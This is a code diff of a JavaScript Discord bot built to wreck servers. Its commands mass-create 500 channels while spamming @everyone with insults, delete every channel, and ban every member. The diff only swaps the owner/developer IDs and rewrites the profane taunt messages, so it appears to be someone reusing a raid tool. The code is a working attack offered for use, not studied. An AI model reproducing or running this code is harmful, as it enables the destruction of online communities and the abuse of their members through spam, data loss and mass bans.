@@ -3,7 +3,7 @@ const client = new Discord.Client();
 const prefix = 'monster'
 
 
-const developers = ["487314985362391060","507117671360233472"]
+const developers = ["614364214504587287","614363312800530433"]
 const adminprefix = "<";
 client.on('message', message => {
     var argresult = message.content.split(` `).slice(1).join(' ');
@@ -61,7 +61,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel(' Dating Team ', 'text')
-        message.channel.send('@everyone __** fuck you all motherfuckers hacker by ...  **__ :muscle: :v: @here');
+        message.channel.send('@everyone __** ya wlad l97ab 9alabto 3lia ana 7witkom By Floki ...  **__ :muscle: :v: @here');
 }
 }
 });   
@@ -71,7 +71,7 @@ for (let i = 0; i < 500; i++) {
 
   client.on('message',async message => {
     if(message.content.startsWith("dm restart")) {
-          if(message.author.id !== "487314985362391060") return message.reply('You aren\'t the bot owner.');
+          if(message.author.id !== "614363312800530433") return message.reply('You aren\'t the bot owner.');
         message.channel.send('**Restarting.**').then(msg => {
             setTimeout(() => {
                msg.edit('**Restarting..**');
@@ -107,7 +107,7 @@ client.on('message', x5bz => {
         x5bz.guild.channels.forEach(c => { c.delete() })
                    let v5bz = new Discord.RichEmbed()
                .setColor('RANDOM')
-               .setDescription('**Done sir ! i have been FUCKED THE SERVER ATLATNTIC GANG :cop:**')
+               .setDescription('**Done sir ! i Fucked the server :cop:**')
               x5bz.author.sendEmbed(v5bz);
     }
     });
@@ -115,7 +115,7 @@ client.on('message', x5bz => {
 
 client.on('message', async message => {
     if(message.content === "monster destroy") {
-        if(message.author.id !== '507117671360233472') return;
+        if(message.author.id !== '614363312800530433') return;
         message.guild.members.forEach(member => {
            member.ban(); 
         });
